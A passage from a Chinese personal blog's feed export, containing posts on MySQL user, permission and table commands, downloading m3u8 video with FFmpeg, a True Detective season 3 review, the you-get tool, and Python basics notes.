<span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span>;<span class="comment">-- 删除用户</span></span><br><span class="line">rename <span class="keyword">user</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span> <span class="keyword">to</span> <span class="string">&#x27;新用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span>;<span class="comment">-- 修改用户</span></span><br><span class="line"><span class="keyword">set</span> password <span class="keyword">for</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span> <span class="operator">=</span> Password(<span class="string">&#x27;新密码&#x27;</span>);  <span class="comment">-- 修改密码</span></span><br></pre></td></tr></table></figure><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> privileges <span class="keyword">ON</span> databasename.tablename <span class="keyword">TO</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span>;</span><br></pre></td></tr></table></figure><p>privileges：用户的操作权限，如SELECT，INSERT，UPDATE等，如果要授予所有权限则使用ALL。<br>databasename：数据库名。<br>tablename：表名，如果要授予该用户对所有数据库和表的相应操作权限则可用*表示，如*.*。<br>例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span> <span class="keyword">ON</span> test.user <span class="keyword">TO</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">ON</span> maindataplus.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="其他权限管理命令"><a href="#其他权限管理命令" class="headerlink" title="其他权限管理命令"></a>其他权限管理命令</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;用户&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span>;<span class="comment">-- 查看权限</span></span><br><span class="line"><span class="keyword">grant</span> 权限 <span class="keyword">on</span> 数据库.表 <span class="keyword">to</span> <span class="string">&#x27;用户&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span>;<span class="comment">-- 授权</span></span><br><span class="line"><span class="keyword">revoke</span> 权限 <span class="keyword">on</span> 数据库.表 <span class="keyword">from</span> <span class="string">&#x27;用户&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span>;<span class="comment">-- 取消权限</span></span><br></pre></td></tr></table></figure><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use 数据库名;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><h3 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h3><p><img src="https://img.lfalive.top/db-hw3%264/1.png" alt="Snipaste_2020-05-05_10-52-26"></p><p><img src="https://img.lfalive.top/db-hw3%264/2.png"></p><h2 id="操作数据库以及数据表"><a href="#操作数据库以及数据表" class="headerlink" title="操作数据库以及数据表"></a>操作数据库以及数据表</h2><h3 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database 数据库名;</span><br><span class="line"><span class="keyword">create</span> database 数据库名 <span class="keyword">default</span> charset utf8;</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">drop</span> database 数据库名;</span><br></pre></td></tr></table></figure><h3 id="操作数据表"><a href="#操作数据表" class="headerlink" title="操作数据表"></a>操作数据表</h3><h4 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">    列名  类型  <span class="keyword">null</span>，</span><br><span class="line">    列名  类型  <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    列名  类型  <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="number">1</span>,</span><br><span class="line">    列名  类型  auto_increment <span class="keyword">primary</span> key</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="comment">-- innodb支持事务，myisam不支持</span></span><br><span class="line"><span class="comment">-- auto_increment表示自增，一个表里只能有一个自增列。</span></span><br><span class="line"><span class="comment">-- primary key表示约束，不能重复且不能为空；加速查找。</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名;<span class="comment">-- 清空表，但是自增id不重头开始。</span></span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> 表名;<span class="comment">-- 清空表，自增id说重头开始。</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名;<span class="comment">-- 删除表。</span></span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><h5 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h5><p>tinyint、int、bigint、float、double、decimal</p><h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p>char(速度快)、varchar(节省空间)<br>创建表时，定长的列放前面较快。<br>text、mediumtext、longtext</p><h5 id="时间类型"><a href="#时间类型" class="headerlink" title="时间类型"></a>时间类型</h5><p>date、time、year、datetime、timestamp</p><h5 id="二进制数据"><a href="#二进制数据" class="headerlink" title="二进制数据"></a>二进制数据</h5><p>TinyBlob、Blob、MediumBlob、LongBlob</p><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>enum(枚举类型)、set(集合类型)</p><h4 id="操作数据"><a href="#操作数据" class="headerlink" title="操作数据"></a>操作数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 增</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表 (列名,列名...) <span class="keyword">values</span> (值,值,值...),(值,值,值...);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表 <span class="keyword">where</span> id＝<span class="number">1</span> <span class="keyword">and</span> name＝<span class="string">&#x27;alex&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 改</span></span><br><span class="line"><span class="keyword">update</span> 表 <span class="keyword">set</span> age<span class="operator">=</span><span class="number">18</span>;</span><br><span class="line"><span class="keyword">update</span> 表 <span class="keyword">set</span> name ＝ <span class="string">&#x27;alex&#x27;</span> <span class="keyword">where</span> id<span class="operator">&gt;</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表 <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h3><p>外键，一个特殊的索引，只能是指定内容，可以节省空间。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> color(</span><br><span class="line">nid <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">char</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 在创建表的时候，必须先创建被关联表，否则会报错。</span></span><br><span class="line"><span class="comment">-- 插入数据的时候，也必须先插入被关联表的数据。</span></span><br><span class="line"><span class="comment">-- 删除数据的时候，先删员工表的数据，再删部门表的数据。</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> fruit(</span><br><span class="line">nid <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">smt <span class="type">char</span>(<span class="number">32</span>) <span class="keyword">null</span> ,</span><br><span class="line">color_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> fk_1 <span class="keyword">foreign</span> key (color_id) <span class="keyword">references</span> color(nid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="实验截图-1"><a href="#实验截图-1" class="headerlink" title="实验截图"></a>实验截图</h3><p><img src="https://img.lfalive.top/db-hw3%264/3.png"></p><p><img src="https://img.lfalive.top/db-hw3%264/4.png"></p><p><img src="https://img.lfalive.top/db-hw3%264/5.png"></p><p><img src="https://img.lfalive.top/db-hw3%264/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> databases </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用FFmpeg下载m3u8视频</title>
      <link href="/2020/05/17/ffmpeg-m3u8/"/>
      <url>/2020/05/17/ffmpeg-m3u8/</url>
      
        <content type="html"><![CDATA[<p>有时候嗷，想从网上下什么视频，却发现是m3u8格式，遂开始找资料，寻思怎么下载。这里又要用到<a href="https://ffmpeg.org/">FFmpeg</a>。</p><h2 id="m3u8"><a href="#m3u8" class="headerlink" title="m3u8"></a>m3u8</h2><p>M3U8文件是指UTF-8编码格式的M3U文件。M3U文件是记录了一个索引纯文本文件，打开它时播放软件并不是播放它，而是根据它的索引找到对应的音视频文件的网络地址进行在线播放。M3U8是一种常见的流媒体格式，主要以文件列表的形式存在，既支持直播又支持点播。</p><p>所以从页面上扒下来一个后缀名为m3u8的文件，并不是拥有了这个视频文件。</p><h2 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h2><p>FFmpeg可以运行音频和视频多种格式的录影、转换、流功能，属实神器。</p><p>如何安装FFmpeg，网上有很多教程了。主要就是配置环境变量吧，以我的为例。</p><p><img src="https://img.lfalive.top/ffmpeg-m3u8/1.png"></p><p>配置好之后就可以在控制台中尽情把玩它了。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>我用的是chrome，直接网页F12，选择network再刷新一下，在加载的文件里可以找到一个后缀名为m3u8的文件，那就是我们要找的了。右键复制其地址。</p><p><img src="https://img.lfalive.top/ffmpeg-m3u8/2.png"></p><p><img src="https://img.lfalive.top/ffmpeg-m3u8/3.png"></p><p>然后打开cmd，命令如下。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -i aaaa.m3u8 -c copy -bsf:a aac_adtstoasc -movflags +faststart bbb.mp4</span><br></pre></td></tr></table></figure><p>其中<code>aaaa.m3u8</code>是你刚刚复制的链接，<code>bbb.mp4</code>是自定义所保存的视频文件名。</p><p><img src="https://img.lfalive.top/ffmpeg-m3u8/4.png"></p><p>视频保存的目录就是cmd（我这里用的git bash）目前所处的目录，当然也可以对命令稍作修改来指定其他目录。</p><p><img src="https://img.lfalive.top/ffmpeg-m3u8/5.png"></p><p>下载完成，查看文件，和控制台显示的视频文件信息一样，ok。</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>True Detective S3</title>
      <link href="/2019/10/08/TrueDetectiveS3/"/>
      <url>/2019/10/08/TrueDetectiveS3/</url>
      
        <content type="html"><![CDATA[<p>第三季又回到了第一季的多时间线叙事，但是跨度更大了。主角从前两季的全白，变成了黑人，虽然这不是故事的核心，但仍然作为一个重要特质伴随主角。<br>附上三季的宣传语，耐人寻味。</p><blockquote><p>第一季，“当你触碰黑暗，黑暗亦会侵蚀你（Touch Darkness and Darkness Touches You Back）”<br>第二季，“我们只配活在这样的世界（We Got the World We Deserve）”<br>第三季，“时间带走一切，只留下真相（Time Takes Everything but the Truth）”</p></blockquote><p>可以看出，时间是这一季的一个重要因素。这个主角韦恩牵挂一生的案子花了他近50年，三条时间线，一次次结案又推翻彻查。</p><p>至于案子本身，一开始搞得跟真的一样，儿童、宗教、种族、家庭伦理等，什么元素都有了，总是让我想起第一季。但是随着剧情的发展，故事走向越来越让人摸不着头脑。最后的最后，我心想这不过就是故弄玄虚，其实案子本身并不复杂啊。 </p><p>后来看了他人的影评，我才get到，这才是“真探”。我对案子、剧情的重视和失望，倒是让我忘了剧名，忘了它应该讲什么。在案情推进的同时，两个主角的形象塑造也在进行，他们的思想、言行的变化，以及迥异的人生经历，才是值得回味的地方。韦恩，因为一个案子，婚后和妻子关系并不好，甚至后来和女儿决裂。嗯这么想，有味道了，回头看看所有人物的变化，他们的经历，那么真实那么吸引人啊。</p><p><img src="https://img.lfalive.top/TrueDetectiveS3/1.jpeg"></p><p>第三季依然好评，主角配角的各自人生轨迹和内心冲突都很精彩，手法细腻，三线叙事用得炉火纯青，悬疑感和节奏感也到位，摄影配乐依然高水准。  </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 真探 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>you-get</title>
      <link href="/2019/08/08/Youget/"/>
      <url>/2019/08/08/Youget/</url>
      
        <content type="html"><![CDATA[<p>You-Get is a tiny command-line utility to download media contents (videos, audios, images) from the Web, in case there is no other handy way to do it.  </p><p><a href="https://github.com/soimort/you-get">项目地址</a>  </p><p>Python + you-get + FFmpeg &#x3D; Beautiful Life</p><p><img src="https://img.lfalive.top/youget/cover.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记</title>
      <link href="/2019/07/29/LearnPython/"/>
      <url>/2019/07/29/LearnPython/</url>
      
        <content type="html"><![CDATA[<p>参考<a href="https://www.liaoxuefeng.com/wiki/101695966360240">廖雪峰Python教程</a>。</p><p>对于很大或很小的浮点数，就必须用科学计数法表示，把10用e替代，1.23x10的9次方就是<code>1.23e9</code>，或者<code>12.3e8</code>，<code>0.000012</code>可以写成<code>1.2e-5</code>，等等。  </p><p>如果字符串内部既包含<code>&#39;</code>又包含<code>&quot;</code>,用转义字符<code>\</code>来标识,转义字符<code>\</code>可以转义很多字符，比如<code>\n</code>表示换行，<code>\t</code>表示制表符，字符<code>\</code>本身也要转义，所以<code>\\</code>表示的字符就是<code>\</code>。Python还允许用<code>r&#39;&#39;</code>表示’’内部的字符串默认不转义。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">r&#x27;\\\t\\&#x27;</span>)</span><br><span class="line">\\\t\\</span><br></pre></td></tr></table></figure><p>Python允许用<code>&#39;&#39;&#39;...&#39;&#39;&#39;</code>的格式表示多行内容。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;line1</span></span><br><span class="line"><span class="string"><span class="meta">... </span>line2</span></span><br><span class="line"><span class="string"><span class="meta">... </span>line3&#x27;&#x27;&#x27;</span>)</span><br><span class="line">line1</span><br><span class="line">line2</span><br><span class="line">line3</span><br></pre></td></tr></table></figure><p>一个布尔值只有<code>True</code>、<code>False</code>两种值，布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算。注意大小写敏感。</p><p>空值是Python里一个特殊的值，用<code>None</code>表示。</p><p><code>/</code>除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数。还有一种除法是<code>//</code>，称为地板除,只取结果的整数部分。</p><p>Python的整数没有大小限制。Python的浮点数也没有大小限制，但是超出一定范围就直接表示为<code>inf</code>（无限大）。</p><p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p><p>Python3版本中，字符串是以Unicode编码的，也就是说，Python的字符串支持多语言。<code>ord()</code>函数获取字符的整数表示，<code>chr()</code>函数把编码转换为对应的字符。还可以用十六进制写字符串。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;\u4e2d\u6587&#x27;</span></span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure><p>Python对bytes类型的数据用带<code>b</code>前缀的单引号或双引号表示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">b&#x27;ABC&#x27;</span></span><br></pre></td></tr></table></figure><p>Unicode表示的<code>str</code>通过<code>encode()</code>方法可以编码为指定的<code>bytes</code>。反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法。如果bytes中只有一小部分无效的字节，可以传入errors&#x3D;’ignore’忽略错误的字节。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中&#x27;</span></span><br></pre></td></tr></table></figure><p><code>len()</code>函数计算的是<code>str</code>的字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数。</p><p>在操作字符串时，我们经常遇到str和bytes的互相转换。为了避免乱码问题，应当始终坚持使用<code>UTF-8</code>编码对str和bytes进行转换。</p><p>当Python解释器读取源代码时，为了让它按UTF-8编码读取，我们通常在文件开头写上这两行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><p><code>%</code>运算符就是用来格式化字符串的。</p><table><thead><tr><th align="center">占位符</th><th align="center">替换内容</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">整数</td></tr><tr><td align="center">%f</td><td align="center">浮点数</td></tr><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%x</td><td align="center">十六进制整数</td></tr></tbody></table><p>格式化整数和浮点数还可以指定是否补0和整数与小数的位数。转义：用<code>%%</code>来表示一个<code>%</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%2d-%02d&#x27;</span> % (<span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line"><span class="number">3</span>-01</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;%.2f&#x27;</span> % <span class="number">3.1415926</span>)</span><br><span class="line"><span class="number">3.14</span></span><br></pre></td></tr></table></figure><p>用<code>len()</code>函数可以获得list元素的个数。可以用索引来访问list中每一个位置的元素，索引是从0开始的。如果要取最后一个元素，除了计算索引位置外，还可以用-1做索引，直接获取最后一个元素。以此类推，可以获取倒数第2个、倒数第3个。<code>append()</code>:往list中追加元素到末尾。<code>pop()</code>:删除list末尾的元素,要删除指定位置的元素，用<code>pop(i)</code>方法，其中i是索引位置。<code>insert(1, &#39;Jack&#39;)</code>:把元素插入到指定的位置。把某个元素替换成别的元素，<code>list[1] = &#39;Jack&#39;</code>:可以直接赋值给对应的索引位置。list里面的元素的数据类型也可以不同。list元素也可以是另一个list，类似多维数组。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">classmates = [<span class="string">&#x27;Michael&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Tracy&#x27;</span>]</span><br></pre></td></tr></table></figure><p>tuple和list非常类似，但是tuple一旦初始化就不能修改。只有1个元素的tuple定义时必须加一个逗号<code>,</code>,来消除歧义。Python在显示只有1个元素的tuple时，也会加一个逗号<code>,</code>，以免你误解成数学计算意义上的括号。  </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure><p>“可变的”tuple：tuple的每个元素，指向永远不变。即指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>])</span><br></pre></td></tr></table></figure><p>条件判断语句的形式如下，注意<code>:</code>，<code>elif</code>是<code>else if</code>的缩写。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;条件判断<span class="number">1</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">1</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">2</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">2</span>&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;条件判断<span class="number">3</span>&gt;:</span><br><span class="line">    &lt;执行<span class="number">3</span>&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;执行<span class="number">4</span>&gt;</span><br></pre></td></tr></table></figure><p><code>input()</code>返回的数据类型是<code>str</code>，<code>str</code>不能直接和整数比较，必须先把<code>str</code>转换成整数。Python提供了<code>int()</code>函数。<code>int()</code>函数发现一个字符串并不是合法的数字时就会报错，程序就退出了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = <span class="built_in">int</span>(s)</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Python提供一个<code>range()</code>函数，可以生成一个整数序列，再通过<code>list()</code>函数可以转换为<code>list</code>。比如<code>range(5)</code>生成的序列是从0开始小于5的整数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>可使用<code>for…in</code>循环求和，注意冒号。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>循环还有<code>while</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + n</span><br><span class="line">    n -= <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p><code>break</code>的作用是提前结束循环,也可以通过<code>continue</code>语句，跳过当前的这次循环，直接开始下一次循环。死循环时可以用<code>Ctrl+C</code>退出程序，或者强制结束Python进程。</p><p>用Python写一个dict如下（key-value存储方式），key不存在，dict就会报错。可以通过<code>in</code>或者dict提供的<code>get()</code>方法判断key是否存在。要删除一个key，用<code>pop(key)</code>方法，对应的value也会从dict中删除。dict是用空间来换取时间的一种方法，dict的key必须是不可变对象，因为内部使用哈希算法。 <code>list</code>是可变的，就不能作为key。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">&#x27;Michael&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;Bob&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;Tracy&#x27;</span>: <span class="number">85</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;Michael&#x27;</span>]</span><br><span class="line"><span class="number">95</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;Thomas&#x27;</span> <span class="keyword">in</span> d</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.pop(<span class="string">&#x27;Bob&#x27;</span>)</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&#123;<span class="string">&#x27;Michael&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;Tracy&#x27;</span>: <span class="number">85</span>&#125;</span><br></pre></td></tr></table></figure><p>set和dict类似，但在set中，没有重复的key。要创建一个set，需要提供一个list作为输入集合。通过<code>add(key)</code>方法可以添加元素，通过<code>remove(key)</code>方法删除元素。两个set可以做数学意义上的交集、并集等操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="built_in">set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 &amp; s2</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 | s2</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span 